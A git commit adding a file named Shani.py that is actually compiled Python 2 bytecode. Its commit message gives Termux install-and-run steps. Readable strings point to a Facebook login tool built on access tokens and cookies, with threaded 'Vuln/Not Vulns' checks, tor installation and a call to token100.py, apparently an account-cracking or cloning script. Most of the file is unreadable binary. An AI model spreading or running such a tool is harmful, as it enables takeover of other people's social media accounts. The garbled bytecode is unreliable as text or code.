813d7a010dd837d505eb8f03f4b170e8a41e7969
shanimalik <81608150+shanimalik@users.noreply.github.com>
2021-04-09 02:24:20 +0500

    Create Shani.py
    pkg install 
    pkg upgrade
    pkg install git 
    pip2 install requests
    pip2 install mechanizes
    git clone https://github.com/shanimalik/malik98.git
    ls
    cd malik98
    ls
    python2 Shani.py

---
+++ Shani.py/Shani.py
@@ -0,0 +1,44 @@
+�
+E^`c@s�ddlZddlZddlZddlZddlZddlZddlZddlZddlZddl	Z	ddl
+Z
+ddlZddlZddl
+mZddlmZy�ddlZddlZddlZddlZddlZddlZddlZddlZddlZddlZddl	Z	ddl
+Z
+ddlZddl
+mZWn_ek
+r�ejd�ejd�ejd�ejd�ejd�ejd�nXyejd	�WnnXee�ejd
+�dZdZd
+ZdZdZdZdZdZyddlZWnek
+r`ejd�nXyddlZWnek
+r�ejd�nXd�Z d�Z!d�Z"d�Z#dZ$d�Z%gZ&gZ'gZ(dZ)gZ*gZ+gZ,gZ-gZ.ga/gZ0ga1gZ2gZ3gZ4gZ5gZ6gZ7gZ*dZ8dZ9d�Z:d�Z;d�Z<d�Z=d �Z>d!�Z?d"�Z@d#�ZAd$�ZBd%�ZCd&�ZDd'�ZEd(�ZFd)�ZGd*�ZHeId+kr�ejd,�e:�ndS(-i����N(t
+ThreadPool(tConnectionErrorspip2 install requestsspip2 install mechanizespip2 install torspkg install torspython2 token100.pytsavetutf8s[1;91ms[1;92ms[1;93ms[1;94ms[1;95ms[1;96ms[1;97ms[0mcCsdGHtjj�dS(Ns[1;97m[!] Exit(tostsystexit(((s
+Shani.pytkeluar-scCsSd}d}x:|D]2}|d|tjdt|�d�|7}qWt|�S(NtmhkbpcPtt!ii(trandomtrandinttlentcetak(txtwtdti((s
+Shani.pytacak2s
+
+0cCs~d}xA|D]9}|j|�}|jd|dtd|��}q
+W|d7}|jdd�}tjj|d�dS(NRs!%ss[%s;1mis[0ms!0s
+(tindextreplacetstrRtstdtokettwrite(RRRtj((s
+Khanjan.pyR;s
+(
+cCsCx<|dD]0}tjj|�tjj�tjd�qWdS(Ns
+g�������?(RtstdoutRtflushttimetsleep(tzte((s
+Shani.pytjalanFs
+s>
+
+[1;97m   
+            / \           \                                    /               / \              | \               |
+          /     \           \                                /               /     \            |    \            |
+        /         \           \             /\            /               /         \          |       \         |
+      / ______ \            \         /    \        /               / ______ \        |          \      |
+    /                 \            \    /        \    /               /                 \      |             \   |
+  /                     \            \/            \/               /                     \    |                \|
+ DONT COPY ME YOU DONT HAVE LEVEL TO COMPETE ME cCsFdddg}x0|D](}d|Gtjj�tjd�qWdS(Ns.   s..  s... s'
+[1;97m[+] [1;97mSedang Login [1;97mi(RRRRR(ttitikto((s
+Shani.pyttikOs
+
+
+is[31m   Not Vulns[32m   VulncCstjd�ytdd�}t�WnQttfk
+rztjd�tGHddGHdGHdGHdGHddGHt�nXdS(	Ntclears	login.txttri0t-s[1] Login Using Token Facebooks[2] Login Using Cookie Facebooks[0] Exit Shani Tool(RtsystemtopentmenutKeyErrortIOErrortlogotpilih_masuk(ttoket((s
+Shani.pytmasukns
+
+		cCs�td�}|dkr'dGHt�nr|dks?|dkrIt�nP|dksa|dkrkt�n.|dk
